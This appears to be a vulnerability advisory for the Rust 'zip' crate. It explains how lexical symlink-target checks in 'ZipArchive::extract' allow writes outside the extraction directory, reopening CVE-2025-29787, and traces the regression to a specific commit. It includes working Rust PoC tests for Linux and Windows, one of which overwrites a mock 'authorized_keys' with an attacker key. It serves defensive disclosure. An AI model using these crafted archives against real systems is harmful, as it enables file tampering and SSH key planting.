---
lang: en
title: Arbitrary file write outside the extraction directory, because `ZipArchive::extract` validates symlink targets lexically (The defense against CVE-2025-29787 was broken in v7.2.0)
project: zip
cwe:
  - CWE-59
  - CWE-22
  - CWE-61
severity: high
cvss: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H
score: "7.4"
verified: 9.0.0-pre3
affected: ">= 7.2.0"
patched: 9.0.0
date: 2026-08-22
---

> - この脆弱性は `v9.0.0` で修正されました．
> - [Arbitrary file write outside the extraction directory, because ZipArchive::extract validates symlink targets lexically. (The defense against CVE-2025-29787 was broken in v7.2.0) · Advisory · zip-rs/zip2 · GitHub](https://github.com/zip-rs/zip2/security/advisories/GHSA-hjqx-j4rw-g7xv)
> - [CVE-2026-115908](https://nvd.nist.gov/vuln/detail/cve-2026-115908) が割り当てられています．

### Summary

- **Verified version:** zip `9.0.0-pre3`
- **Affected versions:** `7.2.0` and later
- **Precondition:** The attacker knows (or can guess) the absolute path of the extraction destination

The validation applied to symlinks is purely lexical.
As a result, an attacker can write arbitrary files outside the extraction directory through a symlink.
Exploitation requires the attacker to know (or guess) the absolute path of the destination, but this is realistic in practice: CI workspaces, `/opt/app`, a fixed Downloads path, and so on.

> **Impact extends further on Windows (verified on real hardware for both the separate-drive and UNC-share cases)**:  
> Because `simplified_components` discards the `Prefix` component, paths like `D:\<same tail as dest>` or a UNC path `\\attacker\share\<same tail>` pass the `starts_with` check.  
> As a result, `outpath.push` gets replaced onto a different drive/remote share, so **a single symlink is enough — no intermediate symlink chain is required**.  
> That said, creating a symlink on Windows requires `SeCreateSymbolicLinkPrivilege` (administrator rights or Developer Mode enabled).
> **Real-hardware verification (Windows 10 VM (19045.2604), `tests/poc_win.rs`)**:  
> With the extraction target set to a temporary directory under `C:`, both of the following paths returned `Ok(())` from `extract()` and successfully wrote outside the extraction target.  
> In both cases `extract()` returned no error (`Ok(())`), and it was confirmed that the contents of `pwned.txt` matched the attacker-specified value.

| Path                                       | symlink target                             | Actual write location (outside dest)    |
| ------------------------------------------ | ------------------------------------------ | --------------------------------------- |
| Separate drive (`escape_via_second_drive`) | `E:\<dest と同じ末尾>\evil`                | `E:\…\dest\evil\pwned.txt`              |
| UNC share (`escape_via_unc_share`)         | `\\localhost\poc\<same tail as dest>\evil` | `\\localhost\poc\…\dest\evil\pwned.txt` |

### Relationship to CVE-2025-29787

This is **not a duplicate** of the existing [CVE-2025-29787](https://github.com/zip-rs/zip2/security/advisories/GHSA-94vh-gphv-8pm8) (2025-03); rather, **the protection introduced for that CVE was subsequently lost**.

#### Timeline (git history, UTC)

| commit     | Date       | Description                                                                                                                           |
| ---------- | ---------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `d4539d6b` | 2025-02-28 | Initial fix for CVE-2025-29787. Canonicalizes output paths and symlink targets and verifies they descend from the destination         |
| `0199ac2c` | 2025-03-15 | **Before the v2.3.0 release**, the above is replaced with a lexical check based on `simplified_components`                            |
| `v2.3.0`   | 2025-03-16 | Released as the CVE fix. **What actually shipped is the lexical check**                                                               |
| `d5cf4b55` | 2026-01-18 | Changes how `simplified_components` handles absolute paths, **from rejecting them to silently stripping them** (released in `v7.2.0`) |

#### Why v2.3.0 was not affected, and how the protection was lost

The `safe_prepare_path` in v2.3.0 performs essentially the same lexical check as the current code. However, `simplified_components` at that time **rejected any path containing an absolute component**, so an absolute symlink target was never accepted in the first place and this attack path did not work.

```rust
// v2.3.0: reject absolute paths
Component::Prefix(_) | Component::RootDir => return None,

// Current: ignore the fact that the path is absolute
Utf8WindowsComponent::Prefix(_) | Utf8WindowsComponent::RootDir => (),
```

`d5cf4b55` was intended to make archives containing absolute path names extractable, but as a side effect **absolute symlink targets now pass the lexical check**, which silently removed the protection against CVE-2025-29787.

#### Verification

The following three cases were compared using the same build (`9.0.0-pre3`):

| Payload / condition                                                      | Result                                                                                                  |
| ------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------- |
| Original PoC for CVE-2025-29787 (relative symlink `parent -> ../`)       | **Blocked** with `Err(InvalidArchive("Invalid symlink target path"))` (the CVE fix itself is effective) |
| PoC in this report (two-stage symlink using absolute paths)              | **Succeeds** with `Ok(())`, writing outside the destination                                             |
| PoC in this report, with the `d5cf4b55` change reverted to `return None` | **Blocked** with `Err(InvalidArchive("Invalid symlink target path"))`                                   |

The first row shows that the fix for the CVE itself still works, confirming that this report is not a duplicate.
The third row confirms that this vulnerability originates from the change in `d5cf4b55`.

#### Differences from CVE-2025-29787

- **Stricter precondition:** This issue requires the absolute path of the destination to be known (`AC:H`). The CVE worked with a relative `../` and had no such precondition.
- **Narrower API surface:** This issue affects only `ZipArchive::extract` (and `extract_unwrapped_root_dir`). `ZipStreamReader::extract` is not affected, because `external_attributes` in the local header is `0` and therefore `is_symlink()` never returns true (the CVE affected both APIs).

### Details

#### Lexical validation of the path string

The symlink validation in `src/read/zipfile.rs: L290-345` is lexical.

**`src/read/zipfile.rs: fn safe_prepare_path` (L316-321):**

```rust
if !crate::path::simplified_components(&target)
    .ok_or(invalid!("Invalid symlink target path"))?
    .starts_with(
        &crate::path::simplified_components(base_path)
            .ok_or(invalid!("Invalid base path"))?,
    )
```

`simplified_components` discards the information that a path is **absolute (drive prefix / root)**, normalizes it lexically, and then merely performs a prefix comparison between the two results. It never looks at how the path actually resolves on the file system.

Consequently, the classic **Zip Slip** vector using `..` is blocked, but paths that involve symlink resolution are not.

**`src/path.rs: fn simplified_components` (L9~26):**

```rust
/// Simplify a path by removing the prefix and parent directories and only return normal components
pub(crate) fn simplified_components(input: &Path) -> Option<Vec<&OsStr>> {
    let mut out = Vec::new();
    let input_str = input.to_str()?;
    for component in Utf8WindowsPath::new(input_str).components() {
        match component {
            // Skip prefix and root directory components instead of rejecting the entire path
            // This allows extraction of ZIP files with absolute paths, similar to other ZIP tools
            Utf8WindowsComponent::Prefix(_) | Utf8WindowsComponent::RootDir => (),
            Utf8WindowsComponent::ParentDir => {
                out.pop()?;
            }
            Utf8WindowsComponent::Normal(s) => out.push(OsStr::new(s)),
            Utf8WindowsComponent::CurDir => (),
        }
    }
    Some(out)
}
```

#### Insufficient validation of `target`

Once the path check passes, **`src/read/zipfile.rs: fn safe_prepare_path` (L345)** performs `outpath.push(target)`, but **whether any intermediate component of `target` is itself a symlink is never checked**.

In addition, `make_symlink`, which is called from `extract_internal`, delegates to `make_symlink_impl` and only validates that the archive-supplied `target` is valid UTF-8.
There is no check that `target` stays inside the destination, so the symlink is created as-is.

**`src/read/mod.rs: fn extract_internal` (L396-406):**

```rust
#[cfg(any(unix, windows))]
if file.is_symlink() {
    let mut target = Vec::with_capacity(file.size() as usize);
    file.read_to_end(&mut target)?;
    drop(file);
    make_symlink(&outpath, &target, &self.shared.files)?;
    continue;
} else if file.is_dir() {
    make_writable_dir_all(&outpath)?;
    continue;
}
```

**`src/read/mod.rs: fn make_symlink_impl` (L57-90):**

```rust
#[cfg(unix)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    _existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    std::os::unix::fs::symlink(Path::new(&target_str), outpath)?;
    Ok(())
}

#[cfg(windows)]
pub(crate) fn make_symlink_impl<T>(
    outpath: &Path,
    target_str: &str,
    existing_files: &IndexMap<Box<[u8]>, T>,
) -> ZipResult<()> {
    use crate::format::functions::is_dir;
    let target = Path::new(OsStr::new(&target_str));
    let target_is_dir_from_archive =
        is_dir(target_str.as_bytes()) && existing_files.contains_key(target_str.as_bytes());
    let target_is_dir = if target_is_dir_from_archive {
        true
    } else if let Ok(meta) = std::fs::metadata(target) {
        meta.is_dir()
    } else {
        false
    };
    if target_is_dir {
        std::os::windows::fs::symlink_dir(target, outpath)?;
    } else {
        std::os::windows::fs::symlink_file(target, outpath)?;
    }
    Ok(())
}
```

#### Contradiction with the doc comment

The documentation comment of `extract` at `src/read/mod.rs: L266-269` states the following.
In reality, however, there is no validation when a symlink is created, and **`canonicalize` is not used to validate symlink targets** (`canonicalize` is used only in **`src/read/mod.rs: fn extract_internal` (L357)**, to normalize the destination directory itself).

```rust
    /// Extract a Zip archive into a directory, overwriting files if they
    /// already exist. Paths are sanitized with [`ZipFile::enclosed_name`]. Symbolic links are only
    /// created and followed if the target is within the destination directory (this is checked
    /// conservatively using [`std::fs::canonicalize`]).
```

Combining the above makes it possible to write outside the destination during extraction:

| entry       | kind    | target                                                        |
| ----------- | ------- | ------------------------------------------------------------- |
| b           | symlink | `/…/outside` (created without validation)                     |
| a           | symlink | `<dest>/b/sub` (lexically under dest, so it passes the check) |
| a/pwned.txt | file    | -                                                             |

Entries are processed in central directory order (`for i in 0..self.len()` at `src/read/mod.rs: L386`), so the order above (`b` -> `a` -> `a/pwned.txt`) is required.

Extraction then proceeds as follows:

1. `b`: without any validation, the symlink `<dest>/b -> /…/outside`, **pointing outside the destination**, is created.
2. `a`: likewise without validation, `<dest>/a -> <dest>/b/sub` is created.
3. `a/pwned.txt`: when `safe_prepare_path` processes the component `a`, it sees that `<dest>/a` is a symlink and validates its target (`<dest>/b/sub`). Lexically that target is under `<dest>`, so the check passes and `outpath` becomes `<dest>/b/sub`.
   - At this point, **the fact that `b`, an intermediate component of the target, is a symlink pointing outside is never re-validated**.
   - Because `a` is not the final component, `make_writable_dir_all` is called and creates `<dest>/b/sub` (which really is `/…/outside/sub`).
4. Finally `File::create` creates `<dest>/b/sub/pwned.txt`; the kernel resolves `b` and writes to **`/…/outside/sub/pwned.txt`**. `extract()` returns `Ok(())`.

### PoC

The PoC below is written as a unit test.
Place it at `tests/poc_linux.rs` and run `cargo test --test poc_linux -- --nocapture` to reproduce.

- `zip_slip_via_symlink`: Write a new file outside the extraction destination
- `overwrite_existing_ssh_authorized_keys`: Overwrite an existing file ~/.ssh/authorized_keys outside the extraction destination

`tests/poc_linux.rs`

```rust
//! PoC for Linux: Write outside the extraction directory via symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//!
//! Mechanism: The symlink target validation is lexical (prefix matching in `simplified_components`)
//! By placing an outward-pointing symlink `b` as an "intermediate component in the resolved path", `b` is traversed by the OS rather than the validation loop, thus escaping outside without being verified.
//! Can be reproduced with `cargo test --test poc_linux -- --nocapture`

#![cfg(unix)]

use std::fs;
use std::io::{Cursor, Write};
use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Verification of writing a new file outside the extraction destination
#[test]
fn zip_slip_via_symlink() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination
    let outside = tmp.path().join("outside"); // A location where writing should not be allowed
    fs::create_dir(&dest).unwrap();
    fs::create_dir(&outside).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Symlink pointing outside (target is created unverified)
    zip.add_symlink("b", outside.to_str().unwrap(), opt).unwrap();
    // a: Symlink whose target starts under dest (passes lexical validation)
    zip.add_symlink("a", dest.join("b/sub").to_str().unwrap(), opt).unwrap();
    // a/pwned.txt: File that escapes outside dest by traversing the intermediate b
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    ZipArchive::from(archive).extract(&dest).unwrap();

    // Verification: File has been written outside dest
    let escaped = outside.join("sub/pwned.txt");
    assert!(escaped.exists(), "escape failed");
    assert_eq!(fs::read_to_string(&escaped).unwrap(), "escaped!");
    println!("wrote outside dest: {}", escaped.display());
}

/// Verification of overwriting an existing file (~/.ssh/authorized_keys) outside the extraction destination
#[test]
fn overwrite_existing_ssh_authorized_keys() {
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest"); // Extraction destination

    // Reproduce victim's existing ~/.ssh/authorized_keys (containing a legitimate key)
    let home = tmp.path().join("home_victim");
    let ssh = home.join(".ssh");
    fs::create_dir_all(&ssh).unwrap();
    let authorized_keys = ssh.join("authorized_keys");
    fs::write(&authorized_keys, "ssh-ed25519 AAAA...LEGIT victim@host\n").unwrap();
    let original = fs::read_to_string(&authorized_keys).unwrap();

    fs::create_dir(&dest).unwrap();

    // Construct a malicious ZIP
    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // b: Outward-pointing symlink to victim's HOME (target unverified)
    // Because it's placed in the middle rather than at the end, the OS traverses it transparently, bypassing validation
    zip.add_symlink("b", home.to_str().unwrap(), opt).unwrap();
    // a: Symlink pointing to <dest>/b/.ssh (passes validation because it is lexically under dest)
    zip.add_symlink("a", dest.join("b/.ssh").to_str().unwrap(), opt).unwrap();
    // a/authorized_keys: File entry that reaches the actual authorized_keys
    zip.start_file("a/authorized_keys", opt).unwrap();
    zip.write_all(b"ssh-ed25519 AAAA...ATTACKER attacker@evil\n").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    // extract() returns Ok(()) without an error (the caller cannot detect it)
    let res = ZipArchive::from(archive).extract(&dest);
    println!("extract() returned: {:?}", res);
    res.unwrap();

    // Verification: Existing file is overwritten with the attacker's content
    let after = fs::read_to_string(&authorized_keys).unwrap();
    println!("--- BEFORE ---\n{original}--- AFTER ---\n{after}");
    assert_ne!(after, original, "file was NOT overwritten");
    assert!(after.contains("ATTACKER"), "attacker content not present");
    println!("OVERWROTE existing file: {}", authorized_keys.display());
}
```

#### Windows PoC (`tests/poc_win.rs`)

This is a test that verifies **escape to a different drive / UNC share via a single symlink**, specific to Windows.
By setting the extraction destination to a temporary directory on `C:` and making the symlink target **an absolute path on a different volume that shares the same tail as dest**, it passes the lexical check in `simplified_components` (which discards the `Prefix`), and the drive/share substitution performed by `outpath.push` results in a write outside of `dest`.

- `escape_via_second_drive`: writes to `E:\<same tail as dest>\evil\pwned.txt` on a separate drive (e.g. `E:`)
- `escape_via_unc_share`: writes to `\\localhost\poc\<same tail as dest>\evil\pwned.txt` on a UNC share (e.g. `\\localhost\poc\`)

````rust
//! Windows PoC: writing to a separate drive / UNC share via a single symlink (GHSA-hjqx-j4rw-g7xv)
//!
//! - author: sl91994
//!
//! The crafted ZIP contains only 2 entries:
//!   1. `a`          : a symlink whose target = `<OTHER>\<same tail as dest>\evil` (absolute path)
//!   2. `a/pwned.txt`: a regular file
//! During extraction, resolving `a` causes outpath to be replaced with `<OTHER>\...\evil`,
//! and `File::create(<OTHER>\...\evil\pwned.txt)` writes outside of dest.
//!
//! # Prerequisites
//! - Windows 10 (build 14972+) through Windows 11
//! - Symlink creation privilege `SeCreateSymbolicLinkPrivilege` = Developer Mode enabled, or run as Administrator.
//! - One volume / share **separate from dest**.
//!   Supply the escape destination via environment variables:
//!     * `POC_OTHER_DRIVE`: root of a separate drive. Must end with `\`. e.g. `D:\`
//!     * `POC_UNC_SHARE`: root of a writable UNC share. Must end with `\`.
//!       e.g. `\\localhost\poc\`
//!       (`net share poc=C:\path\to\share /grant:%USERNAME%,FULL`)
//!
//! # Running
//!
//! ```powershell
//! $env:POC_OTHER_DRIVE = "D:\"
//! $env:POC_UNC_SHARE   = "\\localhost\poc\"
//! cargo test --test poc_win -- --nocapture
//! ```

#![cfg(windows)]

use std::ffi::OsString;
use std::fs;
use std::io::{Cursor, Write};
use std::path::{Component, Path, PathBuf};

use tempfile::TempDir;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

/// Whether we have the privilege needed to create symlinks
fn have_symlink_privilege() -> bool {
    let Ok(tmp) = TempDir::new() else {
        return false;
    };
    let target = tmp.path().join("privcheck_target");
    let link = tmp.path().join("privcheck_link");
    if fs::write(&target, b"x").is_err() {
        return false;
    }
    std::os::windows::fs::symlink_file(&target, &link).is_ok()
}

/// Extract only the Normal components of a path (the tail, with prefix / root dropped)
fn normal_tail(p: &Path) -> Vec<OsString> {
    p.components()
        .filter_map(|c| match c {
            Component::Normal(s) => Some(s.to_os_string()),
            _ => None,
        })
        .collect()
}

/// Returns the `Prefix` (volume identifier) at the head of the path
fn volume_prefix(p: &Path) -> Option<OsString> {
    match p.components().next() {
        Some(Component::Prefix(pre)) => Some(pre.as_os_str().to_os_string()),
        _ => None,
    }
}

/// Verifies the single-symlink escape using the escape destination root `other_root` (a separate volume / share)
fn run_escape(variant: &str, other_root: &str) {
    if !have_symlink_privilege() {
        eprintln!(
            "[SKIP] [{variant}] missing SeCreateSymbolicLinkPrivilege; \
             enable Developer Mode or run as Administrator."
        );
        return;
    }

    // other_root must be an existing, writable root
    let other_root_path = PathBuf::from(other_root);
    if !fs::metadata(&other_root_path)
        .map(|m| m.is_dir())
        .unwrap_or(false)
    {
        eprintln!(
            "[SKIP] [{variant}] escape root {other_root:?} does not exist or is not a \
             directory; check the environment variable."
        );
        return;
    }

    // The extraction destination `dest` is a temp directory (usually on C:). Since the `base` used by
    // safe_prepare_path is the path after canonicalize, match the tail to that.
    let tmp = TempDir::new().unwrap();
    let dest = tmp.path().join("dest");
    fs::create_dir(&dest).unwrap();
    let canon_dest = fs::canonicalize(&dest).unwrap();
    let tail = normal_tail(&canon_dest);

    // Reproduce dest's tail on a separate volume as the escape destination, with evil/ underneath it.
    // Since simplified_components discards the prefix, the target's tail component sequence
    // prefix-matches the base's tail component sequence, passing the lexical check.
    let mut escape_dir = other_root_path.clone();
    for c in &tail {
        escape_dir.push(c);
    }
    escape_dir.push("evil");

    // Confirm it's actually a separate volume (if it's the same volume, it would land inside dest and not be an escape)
    let other_vol = fs::canonicalize(&other_root_path)
        .ok()
        .and_then(|p| volume_prefix(&p));
    let dest_vol = volume_prefix(&canon_dest);
    assert_ne!(
        other_vol, dest_vol,
        "[{variant}] escape root {other_root:?} is on the same volume as dest; \
         point it at a different drive/share (dest vol={dest_vol:?})."
    );

    // Assemble the crafted ZIP (entries: 1 symlink + 1 file)
    let target_str = escape_dir
        .to_str()
        .expect("escape path must be valid UTF-8")
        .to_string();
    println!("[{variant}] dest (canonical) = {}", canon_dest.display());
    println!("[{variant}] symlink target   = {target_str}");

    let mut zip = ZipWriter::new(Cursor::new(Vec::new()));
    let opt = SimpleFileOptions::default();
    // a: an absolute symlink pointing to the separate drive/share (passes the lexical check via matching tail)
    zip.add_symlink("a", &target_str, opt).unwrap();
    // a/pwned.txt: resolving `a` substitutes the drive in outpath, causing the write to land outside dest
    zip.start_file("a/pwned.txt", opt).unwrap();
    zip.write_all(b"escaped-on-windows!").unwrap();
    let archive = zip.finish_into_readable().unwrap();

    let res = ZipArchive::from(archive).extract(&dest);
    println!("[{variant}] extract() returned: {res:?}");

    res.expect("extract() failed");

    let escaped = escape_dir.join("pwned.txt");
    assert!(
        escaped.exists(),
        "[{variant}] escape failed: {} was not created",
        escaped.display()
    );

    let content = fs::read_to_string(&escaped).unwrap();
    println!(
        "[{variant}] WROTE OUTSIDE DEST: {} = {content:?}",
        escaped.display()
    );

    let _ = fs::remove_file(&escaped);
    let _ = fs::remove_dir(&escape_dir);

    assert_eq!(
        content, "escaped-on-windows!",
        "[{variant}] written content mismatch",
    );
}

/// Single-symlink escape to a separate drive (`POC_OTHER_DRIVE`, e.g. `D:\`)
#[test]
fn escape_via_second_drive() {
    match std::env::var("POC_OTHER_DRIVE") {
        Ok(root) if !root.is_empty() => run_escape("drive", &root),
        _ => eprintln!(
            "[SKIP] escape_via_second_drive: POC_OTHER_DRIVE not set \
             (PowerShell: `$env:POC_OTHER_DRIVE=\"D:\\\"`)."
        ),
    }
}

/// Single-symlink escape to a UNC share (`POC_UNC_SHARE`, e.g. `\\localhost\poc\`)
#[test]
fn escape_via_unc_share() {
    match std::env::var("POC_UNC_SHARE") {
        Ok(root) if !root.is_empty() => run_escape("unc", &root),
        _ => eprintln!(
            "[SKIP] escape_via_unc_share: POC_UNC_SHARE not set \
             (PowerShell: `$env:POC_UNC_SHARE=\"\\\\localhost\\poc\\\"`)."
        ),
    }
}
````

### Impact

With the privileges of the process that extracts an untrusted ZIP archive via `ZipArchive::extract` / `ZipArchive::extract_unwrapped_root_dir`, an attacker can **write a file with arbitrary contents to an arbitrary path outside the extraction directory**.

- Because existing files can be overwritten, tampering with files such as `~/.ssh/authorized_keys`, `~/.bashrc`, `.git/hooks/*`, CI configuration, or a service's binaries and configuration files **may lead to remote code execution or privilege escalation**. Destroying critical files can also cause denial of service.
- Extraction **does not fail and returns `Ok(())`**, so the caller has no straightforward way to detect the attack.
- The documentation of `extract()` explicitly states that **symbolic links are only created and followed if the target is within the destination directory**, so downstream applications that rely on this as a sandbox boundary are directly affected.

Exploitation requires the absolute path of the destination to be known, but this is realistic in practice: CI workspaces, `/opt/<app>`, a fixed Downloads directory, and so on.
